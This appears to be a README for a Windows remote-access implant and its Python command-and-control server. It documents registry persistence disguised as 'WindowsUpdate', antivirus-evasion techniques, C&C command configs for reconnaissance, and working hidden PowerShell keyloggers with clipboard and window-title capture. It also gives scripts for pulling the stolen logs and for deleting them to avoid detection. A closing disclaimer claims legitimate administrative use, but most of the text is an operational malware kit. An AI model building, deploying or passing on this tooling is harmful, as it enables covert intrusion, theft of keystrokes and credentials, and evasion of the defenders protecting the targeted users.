# Remote Command Executor

A cross-platform C++ remote command executor with Windows persistence, designed for remote system administration and command execution via HTTP.

## Features

- **Remote Command Execution**: Execute Windows commands from a remote Linux server
- **HTTP Communication**: JSON-based command retrieval via HTTP GET requests
- **Windows Persistence**: Auto-start on system boot using Windows Registry Run key
- **Stealth Operations**: Disguised as "WindowsUpdate" in registry
- **AV Bypass Techniques**: Multiple anti-analysis and evasion techniques
- **Command Output**: Captures and logs command execution results
- **Dynamic Configuration**: Server-side command configuration via JSON
- **Retry Logic**: Built-in retry mechanisms for DNS resolution and HTTP requests

## Architecture

### Components

1. **C++ Binary** (`remote_command_executor.cpp`)
   - Compiled for Windows x64
   - Size: ~276KB (statically linked)
   - No external dependencies

2. **C&C Server** (`server_new.py`)
   - Python-based HTTP server
   - Returns JSON responses with commands
   - Per-client command configuration

3. **Command Configuration** (`commands.json`)
   - JSON file for command management
   - Supports per-IP customization
   - Hot-reload on server restart

### Communication Flow

```
Windows Binary → HTTP GET → Linux Server
                ↓
            JSON Response
                ↓
        Execute Command
                ↓
        Log Output
```

## Installation

### Prerequisites

- **Build System**: MinGW-w64 cross-compiler
- **Target**: Windows 10/11 x64
- **Server**: Linux with Python 3.x

### Building

```bash
# Cross-compile from Linux/macOS
make -f Makefile.win.cpp

# Output: remote_command_executor_cpp_YYYYMMDD_HHMMSS.exe
```

### Deployment

1. **Transfer Binary to Windows**:
```bash
sshpass -p "password" scp remote_command_executor_cpp_*.exe user@target:remote_cmd.exe
```

2. **Start C&C Server**:
```bash
cd server
python3 server_new.py
```

3. **Execute Binary on Windows**:
```bash
remote_cmd.exe <server_ip> <port> --debug
```

## Configuration

### Server Configuration (`commands.json`)

```json
{
  "default": {
    "command": "cmd /c whoami",
    "next": "YOUR_SERVER_IP",
    "sleep": 30
  },
  "192.168.1.100": {
    "command": "cmd /c systeminfo",
    "next": "YOUR_SERVER_IP",
    "sleep": 60
  }
}
```

**Fields**:
- `command`: Windows command to execute
- `next`: Next server IP/domain to connect to
- `sleep`: Seconds to wait before next request

### Persistence Configuration

The binary automatically configures Windows persistence:

- **Registry Key**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Value Name**: `WindowsUpdate`
- **Value Data**: Full path to executable with arguments

## Usage

### Basic Execution

```bash
# Execute with server IP and port
remote_cmd.exe YOUR_SERVER_IP 8080

# Execute with debug logging
remote_cmd.exe YOUR_SERVER_IP 8080 --debug
```

### Server Management

```bash
# Start server
cd /root/asd
bash start_server.sh

# Update commands
vim commands.json
# Restart server to apply changes
bash start_server.sh

# Monitor server logs
tail -f /tmp/server_cnc.log
```

### Verification

```bash
# Check if binary is running on Windows
tasklist | findstr remote_cmd.exe

# Verify persistence registry entry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate

# Check server logs for requests
ssh root@server "tail -f /tmp/server_cnc.log | grep -A 15 'TARGET_IP'"
```

## Security Features

### Stealth Techniques

1. **Registry Disguise**: Uses "WindowsUpdate" name to blend in
2. **HKCU Persistence**: No admin privileges required
3. **No UAC Prompts**: Runs silently at user login
4. **Dynamic API Resolution**: Resolves Windows APIs at runtime
5. **Anti-Analysis**: Multiple AV bypass techniques implemented

### Evasion Techniques

- Obfuscated sleep patterns
- Dynamic DNS resolution with fallback
- Custom string operations to avoid detection
- No hardcoded strings in binary
- Stripped symbols and debugging information

## Testing

### End-to-End Test

```bash
# 1. Build binary
make -f Makefile.win.cpp

# 2. Transfer to Windows
sshpass -p "password" scp remote_command_executor_cpp_*.exe user@target:remote_cmd.exe

# 3. Start server
ssh root@server "cd /root/asd && bash start_server.sh"

# 4. Execute binary
sshpass -p "password" ssh user@target "remote_cmd.exe SERVER_IP 8080 --debug"

# 5. Monitor server logs
ssh root@server "tail -f /tmp/server_cnc.log | grep TARGET_IP"
```

### Persistence Test

```bash
# 1. Execute binary (installs persistence)
remote_cmd.exe SERVER_IP 8080

# 2. Verify registry entry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate

# 3. Reboot system
shutdown /r /t 60

# 4. After reboot, verify binary auto-started
tasklist | findstr remote_cmd.exe
```

## Compilation Flags

```makefile
CC = x86_64-w64-mingw32-g++
CFLAGS = -std=c++11 -O3 -static-libgcc -static-libstdc++ -static \
         -s -Wl,--strip-all \
         -fno-stack-protector -fno-ident \
         -ffunction-sections -fdata-sections \
         -Wl,--gc-sections -Wl,--build-id=none \
         -fomit-frame-pointer -fno-unroll-loops
LIBS = -lws2_32 -ladvapi32 -lkernel32 -lntdll
```

## File Structure

```
.
├── remote_command_executor.cpp    # Main C++ source
├── Makefile.win.cpp               # Build configuration
├── server_new.py                  # C&C server
├── commands.json                  # Command configuration
├── start_server.sh                # Server startup script
└── README.md                      # This file
```

## Windows System Monitoring

### Overview

Once the binary is executed on the target Windows system, you can monitor and gather comprehensive system information using remote commands. The binary executes commands and logs output to files that can be retrieved.

### Monitoring Commands

Configure these commands in `commands.json` on the Linux server to gather system intelligence:

#### 1. System Information
```json
{
  "command": "cmd /c systeminfo > C:\\temp\\sysinfo.txt && type C:\\temp\\sysinfo.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 2. Running Processes
```json
{
  "command": "cmd /c tasklist /v > C:\\temp\\processes.txt && type C:\\temp\\processes.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 3. Network Connections
```json
{
  "command": "cmd /c netstat -ano > C:\\temp\\netstat.txt && type C:\\temp\\netstat.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 4. User Information
```json
{
  "command": "cmd /c whoami /all > C:\\temp\\userinfo.txt && type C:\\temp\\userinfo.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 5. Installed Software
```json
{
  "command": "cmd /c wmic product get name,version > C:\\temp\\software.txt && type C:\\temp\\software.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 120
}
```

#### 6. Active Users
```json
{
  "command": "cmd /c query user > C:\\temp\\users.txt && type C:\\temp\\users.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 7. Scheduled Tasks
```json
{
  "command": "cmd /c schtasks /query /fo LIST /v > C:\\temp\\tasks.txt && type C:\\temp\\tasks.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 90
}
```

#### 8. Startup Programs
```json
{
  "command": "cmd /c wmic startup get caption,command > C:\\temp\\startup.txt && type C:\\temp\\startup.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 9. Network Configuration
```json
{
  "command": "cmd /c ipconfig /all > C:\\temp\\ipconfig.txt && type C:\\temp\\ipconfig.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 10. Firewall Status
```json
{
  "command": "cmd /c netsh advfirewall show allprofiles > C:\\temp\\firewall.txt && type C:\\temp\\firewall.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 11. Environment Variables
```json
{
  "command": "cmd /c set > C:\\temp\\env.txt && type C:\\temp\\env.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 12. Disk Information
```json
{
  "command": "cmd /c wmic logicaldisk get name,size,freespace > C:\\temp\\disks.txt && type C:\\temp\\disks.txt",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

#### 13. Keylogger - Capture Keystrokes

**PowerShell Keylogger** - Captures all keystrokes to a log file:

```json
{
  "command": "powershell -WindowStyle Hidden -Command \"$path='C:\\temp\\keys.log'; Add-Type -AssemblyName System.Windows.Forms; $lastKey=''; while($true){Start-Sleep -Milliseconds 50; foreach($key in [Enum]::GetValues([System.Windows.Forms.Keys])){if([System.Windows.Forms.Control]::IsKeyLocked($key)){if($key -ne $lastKey){Add-Content $path \\\"[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $key\\\"; $lastKey=$key}}}}\" &",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

**Retrieve Keylogger Output**:
```bash
# View captured keystrokes
sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type C:\\temp\\keys.log"

# Download keylog file
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keys.log ./keylogs/
```

**Advanced Keylogger with Clipboard Monitoring**:

```json
{
  "command": "powershell -WindowStyle Hidden -Command \"$log='C:\\temp\\keylog.txt'; Add-Type -AssemblyName System.Windows.Forms; $lastClip=''; while($true){try{$clip=[System.Windows.Forms.Clipboard]::GetText(); if($clip -and $clip -ne $lastClip){Add-Content $log \\\"[$(Get-Date)] CLIPBOARD: $clip\\\"; $lastClip=$clip}}catch{}; Start-Sleep -Seconds 2}\" &",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

**Keylogger with Window Title Tracking**:

```json
{
  "command": "powershell -WindowStyle Hidden -Command \"$log='C:\\temp\\activity.log'; Add-Type @\\\"using System; using System.Runtime.InteropServices; using System.Text; public class Win{[DllImport(\\\\\\\"user32.dll\\\\\\\")] public static extern IntPtr GetForegroundWindow(); [DllImport(\\\\\\\"user32.dll\\\\\\\")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);}\\\"; while($true){$h=[Win]::GetForegroundWindow(); $t=New-Object System.Text.StringBuilder 256; [Win]::GetWindowText($h,$t,256); Add-Content $log \\\"[$(Get-Date)] Window: $($t.ToString())\\\"; Start-Sleep -Seconds 5}\" &",
  "next": "YOUR_SERVER_IP",
  "sleep": 60
}
```

**Stop Keylogger**:
```json
{
  "command": "cmd /c taskkill /F /IM powershell.exe && echo Keylogger stopped",
  "next": "YOUR_SERVER_IP",
  "sleep": 30
}
```

**Retrieve and Clear Keylogger Logs**:
```bash
# Retrieve all keylogger files
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keys.log ./
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keylog.txt ./
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/activity.log ./

# Clear keylogger logs after retrieval
sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "del C:\\temp\\keys.log C:\\temp\\keylog.txt C:\\temp\\activity.log"
```

### Comprehensive Monitoring Script

Create a monitoring command that gathers all information at once:

```json
{
  "command": "cmd /c (echo === SYSTEM INFO === && systeminfo && echo. && echo === PROCESSES === && tasklist /v && echo. && echo === NETWORK === && netstat -ano && echo. && echo === USER INFO === && whoami /all) > C:\\temp\\monitor.log && type C:\\temp\\monitor.log",
  "next": "YOUR_SERVER_IP",
  "sleep": 120
}
```

### Retrieving Logs from Linux Server

The binary logs output to `C:\temp\` on Windows. To retrieve these logs from your Linux server:

#### Method 1: Direct SCP Retrieval
```bash
# Retrieve specific log file
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/monitor.log ./logs/

# Retrieve all logs
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/*.txt ./logs/
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/*.log ./logs/
```

#### Method 2: SSH Command to View Logs
```bash
# View specific log
sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type C:\\temp\\monitor.log"

# View latest monitoring log
sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type C:\\temp\\sysinfo.txt"

# List all log files
sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "dir C:\\temp\\*.txt C:\\temp\\*.log"
```

#### Method 3: Automated Log Collection Script

Create `collect_logs.sh`:

```bash
#!/bin/bash
# Automated log collection from Windows target

TARGET_HOST="YOUR_TARGET_IP"
TARGET_USER="administrator"
TARGET_PASS="YOUR_WINDOWS_PASSWORD"
LOG_DIR="./collected_logs/$(date +%Y%m%d_%H%M%S)"

mkdir -p "$LOG_DIR"

echo "Collecting logs from $TARGET_HOST..."

# Collect all log files
sshpass -p "$TARGET_PASS" scp -o StrictHostKeyChecking=no \
    "${TARGET_USER}@${TARGET_HOST}:C:/temp/*.{txt,log}" \
    "$LOG_DIR/" 2>/dev/null

# Display summary
echo "Logs collected to: $LOG_DIR"
ls -lh "$LOG_DIR"

# Display latest monitoring log
if [ -f "$LOG_DIR/monitor.log" ]; then
    echo ""
    echo "=== Latest Monitoring Log ==="
    cat "$LOG_DIR/monitor.log"
fi
```

Usage:
```bash
chmod +x collect_logs.sh
./collect_logs.sh
```

### Real-Time Monitoring

Monitor the Windows system in real-time by updating commands and checking server logs:

```bash
# Monitor server logs for command execution
ssh root@SERVER_HOST "tail -f /tmp/server_cnc.log | grep -A 20 'YOUR_TARGET_IP'"

# Update monitoring command
vim commands.json
# Restart server to apply
ssh root@SERVER_HOST "cd /root/asd && bash start_server.sh"

# Wait for next request cycle (check sleep duration in commands.json)
# Then collect logs
./collect_logs.sh
```

### Continuous Monitoring Setup

For continuous monitoring, create a command that runs periodically:

```json
{
  "command": "cmd /c echo [%date% %time%] >> C:\\temp\\activity.log && tasklist >> C:\\temp\\activity.log && netstat -ano >> C:\\temp\\activity.log && type C:\\temp\\activity.log",
  "next": "YOUR_SERVER_IP",
  "sleep": 300
}
```

This appends system state every 5 minutes to `activity.log`.

### Binary Debug Logs

The binary itself creates debug logs when run with `--debug` flag:

```bash
# View binary debug log on Windows
sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type %USERPROFILE%\\debug.log"

# Retrieve binary debug log
sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:debug.log ./binary_debug.log
```

### Monitoring Best Practices

1. **Rotate Logs**: Clear old logs periodically to avoid detection
   ```json
   {
     "command": "cmd /c del C:\\temp\\*.txt C:\\temp\\*.log && echo Logs cleared",
     "next": "YOUR_SERVER_IP",
     "sleep": 60
   }
   ```

2. **Compress Logs**: Compress logs before retrieval
   ```bash
   sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "powershell Compress-Archive -Path C:\\temp\\*.log -DestinationPath C:\\temp\\logs.zip"
   sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/logs.zip ./
   ```

3. **Scheduled Collection**: Use cron for automated log collection
   ```bash
   # Add to crontab
   */30 * * * * /path/to/collect_logs.sh >> /var/log/collection.log 2>&1
   ```

4. **Stealth**: Use inconspicuous log file names
   ```json
   {
     "command": "cmd /c systeminfo > C:\\temp\\update.tmp && type C:\\temp\\update.tmp",
     "next": "YOUR_SERVER_IP",
     "sleep": 60
   }
   ```

## Troubleshooting

### Binary Not Connecting

```bash
# Test network connectivity
curl http://SERVER_IP:8080/

# Check Windows firewall
netsh advfirewall show allprofiles

# Verify DNS resolution
nslookup SERVER_IP
```

### Persistence Not Working

```bash
# Verify registry entry exists
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate

# Check registry value points to correct path
# Should show full path to remote_cmd.exe with arguments

# Manually update if needed
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "C:\path\to\remote_cmd.exe SERVER_IP PORT --debug" /f
```

### Server Not Responding

```bash
# Check if server is running
ps aux | grep server_new.py

# Verify port is listening
ss -tuln | grep 8080

# Check server logs
tail -f /tmp/server_cnc.log
```

## Development

### Building from Source

```bash
# Clone repository
git clone git@github.com:iklobato/mal_win.git
cd mal_win

# Build
make -f Makefile.win.cpp

# Clean build artifacts
make -f Makefile.win.cpp clean
```

### Testing Locally

```bash
# Start local server
python3 server_new.py

# Test with curl
curl http://localhost:8080/
# Expected: {"command": "...", "next": "...", "sleep": ...}
```

## License

This project is for educational and authorized testing purposes only. Unauthorized use is prohibited.

## Disclaimer

⚠️ **WARNING**: This tool is designed for legitimate system administration and authorized security testing only. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse of this software.

## Credits

Developed for remote system administration and security research purposes.
